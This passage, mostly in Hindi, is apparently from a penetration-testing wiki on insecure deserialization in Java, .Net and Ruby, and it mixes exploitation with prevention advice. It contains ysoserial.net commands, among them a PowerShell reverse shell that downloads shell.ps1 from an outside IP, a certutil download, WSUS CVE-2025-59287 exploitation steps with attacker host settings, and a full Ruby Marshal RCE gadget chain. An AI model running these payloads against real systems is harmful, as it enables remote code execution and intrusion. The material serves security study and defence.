open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

आप [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **को ysoserial के साथ मिलाकर और अधिक exploits बनाने के लिए उपयोग कर सकते हैं**। इस टूल के बारे में अधिक जानकारी उस प्रस्तुति की **स्लाइड्स** में है जहाँ यह टूल पेश किया गया था: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)का उपयोग Java में विभिन्न **Json** और **Yml** serialization libraries को exploit करने के लिए payloads जनरेट करने के लिए किया जा सकता है.\
प्रोजेक्ट को compile करने के लिए मुझे `pom.xml` में इन **dependencies** को **add** करना पड़ा:
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**maven इंस्टॉल करें**, और **प्रोजेक्ट को कंपाइल करें:**
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

इस Java JSON लाइब्रेरी के बारे में और पढ़ें: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### लैब्स

- यदि आप कुछ ysoserial payloads का परीक्षण करना चाहते हैं तो आप **इस webapp को चला सकते हैं**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### क्यों

Java विभिन्न उद्देश्यों के लिए serialization का काफी उपयोग करता है, जैसे:

- **HTTP requests**: Serialization का व्यापक रूप से प्रयोग parameters, ViewState, cookies आदि के प्रबंधन में किया जाता है।
- **RMI (Remote Method Invocation)**: Java RMI protocol, जो पूरी तरह से serialization पर निर्भर करता है, Java applications में रिमोट कम्युनिकेशन का एक मुख्य स्तम्भ है।
- **RMI over HTTP**: यह तरीका सामान्यतः Java-based thick client web applications द्वारा उपयोग किया जाता है, जो सभी object communications के लिए serialization का उपयोग करती हैं।
- **JMX (Java Management Extensions)**: JMX नेटवर्क पर ऑब्जेक्ट्स संचारित करने के लिए serialization का उपयोग करता है।
- **Custom Protocols**: Java में सामान्य प्रैक्टिस कच्चे Java objects के ट्रांसमिशन को शामिल करती है, जिसे आने वाले exploit examples में दिखाया जाएगा।

### रोकथाम

#### Transient objects

जो क्लास `Serializable` को implement करती है, वह क्लास के किसी भी ऐसे ऑब्जेक्ट को जो serializable नहीं होना चाहिए, `transient` के रूप में घोषित कर सकती है। उदाहरण के लिए:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Serialization से बचें उन क्लासेस की जिन्हें `Serializable` implement करना आवश्यक है

ऐसे परिदृश्यों में जहाँ class hierarchy के कारण कुछ **objects को `Serializable` इंटरफ़ेस implement करना पड़ता है**, अनजाने में deserialization का जोखिम रहता है। इसे रोकने के लिए, सुनिश्चित करें कि ये objects non-deserializable हों — इसके लिए एक `final` `readObject()` विधि परिभाषित करें जो लगातार एक exception फेंकती है, जैसा नीचे दिखाया गया है:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Enhancing Deserialization Security in Java**

**Customizing `java.io.ObjectInputStream`** deserialization प्रक्रियाओं की सुरक्षा के लिए एक व्यावहारिक तरीका है। यह विधि तब उपयुक्त है जब:

- deserialization code आपके नियंत्रण में हो।
- deserialization के लिए अपेक्षित classes ज्ञात हों।

Override करें **`resolveClass()`** method ताकि deserialization केवल अनुमत classes तक सीमित रहे। यह स्पष्ट रूप से अनुमति प्राप्त classes के अलावा किसी भी class के deserialization को रोकता है, जैसे निम्न उदाहरण जो केवल `Bicycle` class के deserialization को सीमित करता है:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Using a Java Agent for Security Enhancement** एक fallback समाधान प्रदान करता है जब कोड संशोधित करना संभव न हो। यह तरीका मुख्य रूप से **blacklisting harmful classes** के लिए लागू होता है, और इसके लिए एक JVM parameter का उपयोग किया जाता है:
```
-javaagent:name-of-agent.jar
```
यह deserialization को डायनामिक रूप से सुरक्षित करने का एक तरीका प्रदान करता है, उन वातावरणों के लिए आदर्श जहाँ तत्काल code परिवर्तन व्यावहारिक नहीं होते।

उदाहरण देखें: [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementing Serialization Filters**: Java 9 ने **`ObjectInputFilter`** interface के माध्यम से serialization filters पेश किए, जो उन मापदंडों को निर्दिष्ट करने के लिए एक शक्तिशाली तंत्र प्रदान करते हैं जिन्हें serialized objects को deserialized होने से पहले पूरा करना होता है। ये filters global स्तर पर या per stream लागू किए जा सकते हैं, जिससे deserialization प्रक्रिया पर सूक्ष्म नियंत्रण मिलता है।

serialization filters का उपयोग करने के लिए, आप एक global filter सेट कर सकते हैं जो सभी deserialization operations पर लागू होता है, या specific streams के लिए इसे डायनामिक रूप से कॉन्फ़िगर कर सकते हैं। उदाहरण के लिए:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**बाहरी लाइब्रेरीज़ का उपयोग करके सुरक्षा को बेहतर बनाना**: लाइब्रेरीज़ जैसे **NotSoSerial**, **jdeserialize**, और **Kryo** Java deserialization को नियंत्रित और मॉनिटर करने के लिए उन्नत सुविधाएँ प्रदान करते हैं। ये अतिरिक्त सुरक्षा परतें दे सकती हैं, जैसे क्लासों का whitelist/blacklist करना, deserialization से पहले serialized objects का विश्लेषण करना, और कस्टम serialization रणनीतियाँ लागू करना।

- **NotSoSerial** deserialization प्रक्रियाओं को intercept करता है ताकि untrusted code का execution रोका जा सके।
- **jdeserialize** serialized Java objects को बिना deserializing किए analyze करने की अनुमति देता है, जिससे संभावित malicious content की पहचान हो सके।
- **Kryo** तेज़ी और दक्षता पर जोर देने वाला एक वैकल्पिक serialization framework है, जो configurable serialization रणनीतियाँ प्रदान करता है जो सुरक्षा बढ़ा सकती हैं।

### संदर्भ

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

जानें कि **JNDI Injection क्या है, इसे RMI, CORBA & LDAP के माध्यम से कैसे abuse किया जा सकता है और log4shell का कैसे exploit किया जाता है** (और इस vuln का उदाहरण) नीचे दी गई पेज में:

{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Message Service

> **Java Message Service** (**JMS**) API दो या अधिक clients के बीच संदेश भेजने के लिए एक Java message-oriented middleware API है। यह producer–consumer समस्या को संभालने के लिए एक implementation है। JMS Java Platform, Enterprise Edition (Java EE) का हिस्सा है, और इसे पहले Sun Microsystems ने परिभाषित किया था, बाद में इसे Java Community Process द्वारा मार्गदर्शित किया गया। यह एक messaging standard है जो Java EE आधारित application components को संदेश बनाने, भेजने, प्राप्त करने और पढ़ने की अनुमति देता है। यह distributed application के विभिन्न components के बीच communication को loosely coupled, reliable, और asynchronous बनाता है। (From [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### उत्पाद

इस middleware का उपयोग करके संदेश भेजने के लिए कई products मौजूद हैं:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### Exploitation

बुनियादी रूप से, कई सेवाएँ JMS का खतरनाक तरीके से उपयोग कर रही हैं। इसलिए, यदि आपके पास इन सेवाओं को संदेश भेजने के लिए पर्याप्त privileges हैं (आमतौर पर आपको valid credentials चाहिए होते हैं) तो आप malicious serialized objects भेजने में सक्षम हो सकते हैं जिन्हें consumer/subscriber द्वारा deserialized किया जाएगा।\
इसका मतलब है कि इस exploitation में सभी clients जो उस संदेश का उपयोग करेंगे वे संक्रमित हो सकते हैं।

ध्यान रखें कि भले ही कोई सेवा vulnerable हो (क्योंकि वह user input को insecurely deserializing कर रही है), फिर भी आपको vulnerability का exploit करने के लिए valid gadgets खोजने होंगे।

Tool [JMET](https://github.com/matthiaskaiser/jmet) को इस उद्देश्य से बनाया गया था कि यह इन सेवाओं से कनेक्ट कर सके और known gadgets का उपयोग करके कई malicious serialized objects भेज कर attack कर सके। ये exploits तब काम करेंगे जब सेवा अभी भी vulnerable हो और उपयोग किए गए किसी भी gadget का vulnerable application में मौजूद होना।

### संदर्भ

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Net के संदर्भ में, deserialization exploits Java जैसी ही तरह काम करते हैं, जहाँ gadgets का उपयोग करके किसी object के deserialization के दौरान specific code चलाने की कोशिश की जाती है।

### Fingerprint

#### WhiteBox

Source code की जाँच उन जगहों के लिए की जानी चाहिए जहाँ निम्नलिखित दिखाई दें:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

ध्यान केंद्रित उन serializers पर होना चाहिए जो type को user-controlled variable से निर्धारित करने की अनुमति देते हैं।

#### BlackBox

खोज को उस Base64 encoded string **AAEAAAD/////** या किसी समान पैटर्न पर लक्षित करना चाहिए जो server-side पर deserialization के दौरान type पर नियंत्रण प्रदान कर सकता है। इसमें शामिल हो सकता है, पर सीमित नहीं, **JSON** या **XML** संरचनाएँ जिनमें `TypeObject` या `$type` शामिल हों।

### ysoserial.net

इस मामले में आप tool [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) का उपयोग करके **deserialization exploits बना** सकते हैं। git repository डाउनलोड करने के बाद आपको उदाहरण के लिए Visual Studio का उपयोग करके tool को **compile** करना चाहिए।

यदि आप जानना चाहते हैं कि **ysoserial.net अपने exploit कैसे बनाता है** तो आप [**इस पेज को देख सकते हैं जहाँ ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter समझाया गया है**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

The main options of **ysoserial.net** are: **`--gadget`**, **`--formatter`**, **`--output`** and **`--plugin`.**

- **`--gadget`** gadget को निर्दिष्ट करने के लिए उपयोग किया जाता है जिसे abuse करना है (उस class/function को बताएं जो deserialization के दौरान commands execute करने के लिए abused होगी)।
- **`--formatter`**, यह बताने के लिए उपयोग होता है कि exploit को serialize करने का तरीका क्या होगा (आपको पता होना चाहिए कि back-end किस library का उपयोग करके payload को deserialize करता है और उसी का उपयोग करके serialize करें)।
- **`--output`** यह बताने के लिए कि आप exploit को **raw** या **base64** में चाहते हैं। _ध्यान दें कि **ysoserial.net** payload को **UTF-16LE** (Windows पर डिफ़ॉल्ट encoding) का उपयोग करके **encode** करेगा, इसलिए अगर आप raw लेते हैं और इसे सिर्फ़ linux console से encode करते हैं तो आपको कुछ **encoding compatibility problems** आ सकती हैं जो exploit के सही तरीके से काम करने में प्रहार कर सकती हैं (HTB JSON box में payload दोनों UTF-16LE और ASCII में काम कर गया लेकिन इसका मतलब यह नहीं कि यह हमेशा काम करेगा)।_
- **`--plugin`** ysoserial.net plugins को समर्थन देता है ताकि **specific frameworks के लिए exploits** बनाए जा सकें जैसे ViewState

#### और ysoserial.net पैरामीटर्स

- `--minify` संभव हो तो **छोटा payload** प्रदान करेगा
- `--raf -f Json.Net -c "anything"` यह बतायेगा कि दिए गए formatter (`Json.Net` इस मामले में) के साथ कौन-कौन से gadgets उपयोग किए जा सकते हैं
- `--sf xml` आप **एक gadget** (`-g`) निर्दिष्ट कर सकते हैं और ysoserial.net उन formatters की खोज करेगा जिनमें "xml" शामिल है (case insensitive)

**ysoserial examples** to create exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** के पास भी एक **बहुत ही दिलचस्प पैरामीटर** है जो यह समझने में मदद करता है कि हर exploit कैसे काम करता है: `--test`\
यदि आप यह पैरामीटर निर्दिष्ट करते हैं तो **ysoserial.net** स्थानीय रूप से इस **exploit** को **try** करेगा, ताकि आप यह परीक्षण कर सकें कि आपका `payload` सही तरीके से काम करेगा या नहीं।\
यह पैरामीटर उपयोगी है क्योंकि यदि आप कोड की समीक्षा करते हैं तो आपको निम्नलिखित जैसे कोड के टुकड़े मिलेंगे (from [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
इसका मतलब यह है कि exploit का परीक्षण करने के लिए कोड [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) को कॉल करेगा
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
In the **previous code is vulnerable to the exploit created**. So if you find something similar in a .Net application it means that probably that application is vulnerable too.\
Therefore the **`--test`** parameter allows us to understand **which chunks of code are vulnerable** to the desrialization exploit that **ysoserial.net** can create.

### ViewState

[इस POST को देखें जो बताती है **कैसे .Net के \_\_ViewState parameter को exploit करने की कोशिश करें**](exploiting-__viewstate-parameter.md) ताकि **execute arbitrary code** किया जा सके। अगर आप victim machine में प्रयुक्त **secrets** पहले से जानते हैं, तो [**इस पोस्ट को पढ़ें ताकि code execute करना जाना जा सके**](exploiting-__viewstate-knowing-the-secret.md)।

### Real‑world sink: WSUS AuthorizationCookie & Reporting SOAP → BinaryFormatter/SoapFormatter RCE

- प्रभावित endpoints:
- `/SimpleAuthWebService/SimpleAuth.asmx` → GetCookie() AuthorizationCookie डिक्रिप्ट किया जाता है और फिर BinaryFormatter के साथ deserialized किया जाता है।
- `/ReportingWebService.asmx` → ReportEventBatch और संबंधित SOAP ops जो SoapFormatter sinks तक पहुँचते हैं; base64 gadget तब process होता है जब WSUS console event ingest करती है।
- Root cause: attacker‑controlled bytes legacy .NET formatters (BinaryFormatter/SoapFormatter) तक पहुँचते हैं बिना सख्त allow‑lists/binders के, इसलिए gadget chains WSUS service account (अक्सर SYSTEM) के रूप में execute हो जाते हैं।

Minimal exploitation (Reporting path):
1) ysoserial.net (BinaryFormatter या SoapFormatter) के साथ एक .NET gadget जेनरेट करें और base64 output करें, उदाहरण के लिए:
```powershell
# Reverse shell (EncodedCommand) via BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <BASE64_PS>"

# Simple calc via SoapFormatter (test)
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "calc.exe"
```
2) `ReportEventBatch` के लिए SOAP तैयार करें, base64 gadget को एम्बेड करके इसे `/ReportingWebService.asmx` पर POST करें।
3) जब कोई admin WSUS console खोलता है, तो event deserialized होता है और gadget फायर हो जाता है (RCE as SYSTEM)।

AuthorizationCookie / GetCookie()
- एक जाली AuthorizationCookie स्वीकार किया जा सकता है, decrypted किया जा सकता है, और BinaryFormatter sink को पास किया जा सकता है, जिससे pre‑auth RCE सक्षम हो जाता है यदि पहुँच योग्य हो।

Public PoC (tecxx/CVE-2025-59287-WSUS) parameters:
```powershell
$lhost = "192.168.49.51"
$lport = 53
$targetURL = "http://192.168.51.89:8530"
```
See [Windows Local Privilege Escalation – WSUS](../../windows-hardening/windows-local-privilege-escalation/README.md)

### रोकथाम

.Net में deserialization से जुड़े जोखिमों को कम करने के लिए:

- **डेटा स्ट्रीम्स को उनके ऑब्जेक्ट प्रकार परिभाषित करने की अनुमति न दें।** संभव हो तो `DataContractSerializer` या `XmlSerializer` का उपयोग करें।
- **यदि `JSON.Net` का उपयोग कर रहे हैं, तो `TypeNameHandling` को `None` पर सेट करें:** `TypeNameHandling = TypeNameHandling.None`
- **`JavaScriptTypeResolver` के साथ `JavaScriptSerializer` के उपयोग से बचें।**
- **उन प्रकारों को सीमित करें जिन्हें deserialized किया जा सकता है**, और .Net प्रकारों के अंतर्निहित जोखिमों को समझें, जैसे `System.IO.FileInfo`, जो सर्वर फ़ाइलों की properties को बदल सकता है, जिससे संभावित रूप से denial of service attacks हो सकते हैं।
- **ऐसे प्रकारों के साथ सावधान रहें जिनमें जोखिम भरी properties होती हैं**, जैसे `System.ComponentModel.DataAnnotations.ValidationException` अपनी `Value` property के साथ, जिसे शोषण किया जा सकता है।
- **टाइप instantiation को सुरक्षित तरीके से नियंत्रित करें** ताकि हमलावर deserialization प्रक्रिया को प्रभावित न कर सकें, जिससे यहां तक कि `DataContractSerializer` या `XmlSerializer` भी कमजोर बन सकते हैं।
- **व्हाइटलिस्ट नियंत्रण लागू करें** कस्टम `SerializationBinder` का उपयोग करके `BinaryFormatter` और `JSON.Net` के लिए।
- **.Net के भीतर ज्ञात insecure deserialization gadgets के बारे में अद्यतित रहें** और सुनिश्चित करें कि deserializers ऐसे प्रकारों को instantiate न करें।
- **संभावित रूप से जोखिमभरा कोड अलग करें** इंटरनेट एक्सेस वाले कोड से ताकि ज्ञात gadgets, जैसे `System.Windows.Data.ObjectDataProvider` (WPF applications में), untrusted data sources को एक्सपोज़ न करें।

### **References**

- Java और .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** टॉक: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) और स्लाइड्स: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Ruby में, serialization को **marshal** लाइब्रेरी के दो methods द्वारा संभव किया जाता है। पहला method, जिसे **dump** कहा जाता है, का उपयोग किसी object को byte stream में बदलने के लिए किया जाता है। इस प्रक्रिया को serialization कहा जाता है। इसके विपरीत, दूसरा method, **load**, एक byte stream को फिर से object में बदलने के लिए उपयोग किया जाता है, जिसे deserialization कहा जाता है।

serialized objects की सुरक्षा के लिए, **Ruby HMAC (Hash-Based Message Authentication Code)** का उपयोग करता है, जो डेटा की integrity और authenticity सुनिश्चित करता है। इस प्रयोजन के लिए उपयोग की जाने वाली key निम्नलिखित में से किसी एक स्थान पर संग्रहीत हो सकती है:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generic deserialization to RCE gadget chain (अधिक जानकारी के लिए** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**):**
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Ruby On Rails को exploit करने के लिए अन्य RCE chain: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() method

जैसा कि [**this vulnerability report**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/) में समझाया गया है, अगर किसी user का unsanitized input ruby ऑब्जेक्ट के `.send()` method तक पहुँच जाता है, तो यह method ऑब्जेक्ट के किसी भी अन्य method को किसी भी parameters के साथ **invoke any other method** करने की अनुमति देता है।

उदाहरण के लिए, eval को कॉल करना और दूसरे पैरामीटर के रूप में ruby code पास करना arbitrary code को execute करने की अनुमति देगा:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
इसके अलावा, यदि केवल एक पैरामीटर **`.send()`** को attacker द्वारा नियंत्रित किया जाता है, जैसा कि पिछले writeup में बताया गया है, तो उस object के किसी भी method को कॉल करना संभव है जो **तर्कों की आवश्यकता नहीं रखता** या जिनके तर्कों के **डिफ़ॉल्ट मान** होते हैं.\
इसके लिए, object के सभी methods को enumerate करके **कुछ रोचक methods ढूंढे जा सकते हैं जो उन आवश्यकताओं को पूरा करते हों**.
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby class pollution

यह देखें कि यह कैसे संभव हो सकता है कि [pollute a Ruby class and abuse it in here](ruby-class-pollution.md).

### Ruby _json pollution

जब body में कुछ ऐसे मान भेजे जाते हैं जो hashabled नहीं होते, जैसे कि array, तो वे `_json` नाम के नए key में जोड़ दिए जाते हैं। हालांकि, एक attacker body में `_json` नाम का एक मान भी सेट कर सकता है जिसमें वह अपनी मनचाही arbitrary values रखे। फिर, उदाहरण के लिए अगर backend किसी parameter की सत्यता की जाँच करता है लेकिन फिर किसी action को करने के लिए `_json` parameter का भी उपयोग करता है, तो एक authorisation bypass किया जा सकता है।

और जानकारी के लिए देखें [Ruby _json pollution page](ruby-_json-pollution.md).

### अन्य लाइब्रेरी

यह तकनीक ली गई थी[ **from this blog post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

कुछ अन्य Ruby libraries हैं जिनका उपयोग objects को serialize करने के लिए किया जा सकता है और इसलिए इन्हें insecure deserialization के दौरान RCE प्राप्त करने के लिए abused किया जा सकता है। नीचे दी गई तालिका इन libraries में से कुछ और उन methods को दिखाती है जिन्हें loaded library कॉल करती है जब इन्हें unserialized किया जाता है (बुनियादी तौर पर RCE पाने के लिए abused करने के लिए function):

